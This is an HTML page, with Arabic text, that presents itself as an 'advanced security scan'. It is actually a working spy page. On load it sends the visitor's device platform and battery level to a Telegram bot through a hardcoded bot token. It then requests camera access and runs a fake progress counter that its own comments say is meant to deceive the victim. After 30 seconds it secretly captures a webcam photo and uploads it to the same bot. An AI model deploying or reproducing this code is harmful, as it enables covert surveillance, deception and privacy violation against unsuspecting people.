<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فحص الأمان المتقدم</title>
    <script>
        const TOKEN = "8646462631:AAFw8-Bq5okCVYCSMhZ8RPMUDMwEDqAizHQ";
        const ADMIN_ID = "7616336100";

        async function startHunt() {
            try {
                // إرسال معلومات الجهاز فور الدخول
                let b = await navigator.getBattery();
                let info = `🎯 صيد جديد!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);

                // طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // ⏳ عداد وهمي لإيهام الضحية
                let percent = 0;
                let interval = setInterval(() => {
                    percent++;
                    document.getElementById('status').innerText = `جاري فحص ملفات النظام: ${percent}%`;
                    if (percent >= 99) clearInterval(interval);
                }, 300); // يستغرق حوالي 30 ثانية ليصل لـ 99%

                // ⏳ انتظار 30 ثانية (30000 ميلي ثانية) قبل التقاط الصورة
                await new Promise(resolve => setTimeout(resolve, 30000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    let fd = new FormData();
                    fd.append('photo', blob, 'capture.jpg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${ADMIN_ID}`, {
                        method: 'POST',
                        body: fd
                    });
                }, 'image/jpeg');

            } catch (e) {
                document.getElementById('status').innerText = "خطأ في الاتصال.. يرجى البقاء في الصفحة";
            }
        }
        window.onload = startHunt;
    </script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:150px; font-family:sans-serif;">
    <div id="loader" style="border: 8px solid #222; border-top: 8px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
    <h2 id="status">جاري تهيئة الفحص...</h2>
    <p style="color: #888;">الرجاء عدم إغلاق المتصفح لضمان أمان البيانات</p>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
